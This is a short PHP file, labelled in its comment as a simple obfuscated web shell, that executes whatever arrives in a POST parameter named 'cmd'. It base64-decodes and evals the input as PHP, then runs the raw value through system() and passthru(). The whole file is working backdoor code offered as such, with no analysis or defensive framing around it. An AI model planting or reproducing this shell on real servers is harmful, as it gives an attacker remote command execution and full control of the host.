<?php
// Simple obfuscated web shell
if(isset($_POST['cmd'])){
  $cmd = $_POST['cmd'];
  eval(base64_decode($cmd));
  system($cmd);
  passthru($cmd);
}
?>